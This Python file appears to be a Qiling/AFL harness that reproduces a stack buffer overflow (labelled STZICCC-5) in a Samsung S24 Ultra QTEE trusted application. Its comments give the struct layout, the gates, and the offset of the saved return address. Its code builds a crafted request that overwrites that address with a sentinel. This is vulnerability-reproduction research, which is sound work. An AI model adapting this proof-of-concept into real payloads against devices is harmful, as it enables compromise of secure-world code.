from .params import *
from qiling import Qiling
import struct, os

# === STZICCC-5 reproduction harness =========================================
# Target: Samsung S24 Ultra (SM-S928B) ICCC QTEE TA, tz_iccc.ta.
#
# Staging model (see tz_iccc.json): GP lifecycle stubbed (returns TEE_SUCCESS);
# InvokeCommand points DIRECTLY at the CICCCGetDeviceStatus data worker @0x254.
# Worker ABI (confirmed in binary):
#   w0 = status_slot-ish, w1 = msg class, x2 = request struct (-> x19), w3 = cmd
#
# The request struct (x19) is a FLAT 8-byte-field cmnlib/qsee struct (NOT a
# 16-byte GP TEE_Param[4]):
#   [x19+0x00] -> x8, then ldr w22,[x8]   (ctx; [x19] must point at a readable u32)
#   [x19+0x08] == 4                        (gate @0x2ac)
#   [x19+0x10] -> x23 = SRC buffer ptr     (@0x2dc)
#   [x19+0x18] -> w24 = SRC size (u32)     (@0x2e0)  <-- NEVER bounded
#   [x19+0x20] -> x25 = OUT ptr (str w0)   (@0x2d4 / @0x314; must be writable)
#   [x19+0x28] == 8                        (gate @0x2b8)
#   [x19+0x30] -> x21, [x19+0x38] -> x20   (2nd buffer/size; @0x2c0)
# Gates before the copy are INLINE only: w1&0xffff==0 (@0x270) and w3==0x22
# (GetDeviceStatus, @0x29c). NO validation/category function runs before the copy.
#
# BUG (STZICCC-5):
#   0x2f0 mov x0, sp            ; dst = the worker's 32-byte stack scratch buffer
#   0x2fc stp q0, q0, [sp]      ; zero 32 bytes
#   0x300 bl 0x7f1c            ; stpncpy(dst=sp, src=x23, len=x24)  [internal,
#                                bounded ONLY by x24=size, no dst-size clamp]
# saved x29/x30 are at sp+0x20 / sp+0x28 (frame is sub sp,#0x70; stp x29,x30,
# [sp,#0x20]); there is NO stack canary. A size >= 0x30 with >= 0x30 non-NUL
# source bytes overwrites the saved return address (x30) at sp+0x28. The copy
# precedes the per-caller ACL check_ta_cmd_permission@0x14dc (@0x310).
#
# Because the stpncpy primitive is INTERNAL (statically-linked libc-style code,
# not a hooked import), the OOB write executes natively on the guest stack -- the
# emulator's asan only covers the heap. Detection is therefore the corrupted
# RETURN: when the worker reaches `ret` @0x358 it loads the smashed x30 and
# branches to it -> UC_ERR_FETCH_UNMAPPED -> AFL crash (errno 6). We set the
# overwrite bytes to a deliberately unmapped non-canonical sentinel so the
# corrupted-PC fetch faults reliably.

AFL_EXIT = 0x13370
CMD_GETDEVSTATUS = 0x22     # GetDeviceStatus (the worker's required w3)

STRUCT_BASE = 0x53000000    # request struct (flat 8-byte fields)
SRC_BASE    = 0x53100000    # source buffer copied into the 32-byte stack buf
OUT_BASE    = 0x53200000    # out ptr ([x19+0x20]); status written here
CTX_BASE    = 0x53300000    # ctx block ([x19+0x00] -> readable u32)
BUF2_BASE   = 0x53400000    # 2nd buffer ([x19+0x30])
REGION_SIZE = 0x10000

# overwrite sentinel: a recognizable, unmapped, non-canonical address so the
# corrupted `ret` faults on fetch (and is obviously attacker-controlled in logs).
SMASH = 0x4141414141414141

# default overflow size (>= 0x30 to reach x30). HARNESS env forces a fixed size.
DEFAULT_SIZE = int(os.environ.get("ICCC_SIZE", str(0x60)), 0) & 0xFFFFFFFF


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, name in ((STRUCT_BASE, "struct"), (SRC_BASE, "src"), (OUT_BASE, "out"),
                       (CTX_BASE, "ctx"), (BUF2_BASE, "buf2")):
        try:
            ql.mem.map(base, REGION_SIZE, info=f"[iccc] {name}")
        except Exception as e:
            ql.log.warning(f"[iccc] map {name} @ {hex(base)}: {e}")
    print(f"[iccc] init: struct@{hex(STRUCT_BASE)} src@{hex(SRC_BASE)} out@{hex(OUT_BASE)}")


def _build_struct(size):
    s = bytearray(0x40)
    struct.pack_into("<Q", s, 0x00, CTX_BASE)          # [+0x00] ctx ptr (-> u32)
    struct.pack_into("<Q", s, 0x08, 4)                 # [+0x08] == 4 (gate)
    struct.pack_into("<Q", s, 0x10, SRC_BASE)          # [+0x10] src ptr
    struct.pack_into("<Q", s, 0x18, size & 0xFFFFFFFF) # [+0x18] src size (unbounded)
    struct.pack_into("<Q", s, 0x20, OUT_BASE)          # [+0x20] out ptr (writable)
    struct.pack_into("<Q", s, 0x28, 8)                 # [+0x28] == 8 (gate)
    struct.pack_into("<Q", s, 0x30, BUF2_BASE)         # [+0x30] 2nd buf ptr
    struct.pack_into("<Q", s, 0x38, 0x100)             # [+0x38] 2nd buf size
    return bytes(s)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives the copy size across [0 .. REGION_SIZE]; size > 0x28 overflows
    # the 32-byte stack buffer, size >= 0x30 corrupts saved x30 (the return).
    size = DEFAULT_SIZE
    if "ICCC_SIZE" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        size = v % (REGION_SIZE + 1)

    # source: non-NUL bytes so stpncpy doesn't terminate early; bytes at offset
    # 0x28..0x30 (which land on saved x30) = the SMASH sentinel for a clean
    # corrupted-return fault. Everything else 'A'.
    src = bytearray(b"\x41" * REGION_SIZE)
    src[0x28:0x30] = struct.pack("<Q", SMASH)
    ql.mem.write(SRC_BASE, bytes(src))
    ql.mem.write(CTX_BASE, b"\x00" * 0x100)            # ctx u32 readable
    ql.mem.write(OUT_BASE, b"\x00" * 0x100)
    ql.mem.write(STRUCT_BASE, _build_struct(size))

    # keep the GP param machinery happy (unused: we override the ABI below)
    setup_params_fuzz(ql, CMD_GETDEVSTATUS, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # worker(w0=status_slot, w1=class=0, x2=struct, w3=cmd=0x22); on a benign
    # (small-size) input the worker returns normally to the AFL exit.
    ql.arch.regs.x0 = 0
    ql.arch.regs.x1 = 0                       # class 0 -> data path (passes @0x270)
    ql.arch.regs.x2 = STRUCT_BASE
    ql.arch.regs.x3 = CMD_GETDEVSTATUS        # 0x22 (passes @0x29c)
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[iccc] cmd=0x22 GetDeviceStatus size={size:#x} -> stpncpy(sp[32], src, {size:#x}) "
          f"(saved x30 @ sp+0x28; overflow when size>=0x30)")
    return True
